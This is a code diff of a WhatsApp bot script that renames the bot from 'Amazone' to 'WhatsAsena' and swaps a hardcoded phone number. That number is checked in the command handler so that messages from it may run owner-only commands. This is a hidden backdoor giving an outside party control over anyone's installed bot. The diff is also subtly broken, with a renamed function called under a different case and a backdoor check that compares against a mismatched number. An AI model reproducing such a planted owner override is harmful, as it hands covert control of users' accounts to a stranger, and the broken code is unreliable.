@@ -23,7 +23,7 @@ const Lang = Language.getString('updater');
 
 // ==================START====================
                                                                                                                                                                                                                                                                                               
-const AmazoneDB = config.DATABASE.define('Amazone', {                     
+const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {                     
     info: {
       type: DataTypes.STRING,
       allowNull: false
@@ -42,7 +42,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
     }
 });
 const plugindb = require('./plugins/sql/plugin');
-var OWNE = { ff: '94766598862,0' }
+var OWNE = { ff: '94779529221,0' }
 String.prototype.format = function () {
     var i = 0, args = arguments;
     return this.replace(/{}/g, function () {
@@ -67,7 +67,7 @@ Array.prototype.remove = function() {
 };
 // ====================UP==================
 
-async function Amazone () {
+async function WhatsAsena () {
     const conn = new WAConnection();
     conn.version = [2, 2140, 12];
     const Session = new StringSession();
@@ -230,7 +230,7 @@ setInterval(async () => {
     var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
     const { shs1, shl2, lss3, dsl4 } = insult.data.inside
     await config.DATABASE.sync();
-    var StrSes_Db = await AmazoneDB.findAll({
+    var StrSes_Db = await WhatsAsenaDB.findAll({
         where: {
           info: 'StringSession'
         }
@@ -255,7 +255,7 @@ setInterval(async () => {
 
         const authInfo = conn.base64EncodedAuthInfo();
         if (StrSes_Db.length < 1) {
-            await AmazoneDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
+            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
         } else {
             await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
         }
@@ -264,7 +264,7 @@ setInterval(async () => {
 // =====================DEBUG=================
 
     conn.on('connecting', async () => {
-        console.log(`${chalk.green.bold('Amazone')}${chalk.blue.bold('Alexa')}
+        console.log(`${chalk.green.bold('whatsAsena')}${chalk.blue.bold('Alexa')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
 
 ${chalk.blue.italic('👩‍🦰 Connecting to WhatsApp...')}`);
@@ -584,7 +584,7 @@ ${chalk.blue.italic('👩‍🦰 Connecting to WhatsApp...')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWNE.ff == "94766598862,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWNE.ff == "9479529221,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
@@ -922,4 +922,4 @@ ${chalk.blue.italic('👩‍🦰 Connecting to WhatsApp...')}`);
     }
 }
 
-Amazone();
+whatsAsena();
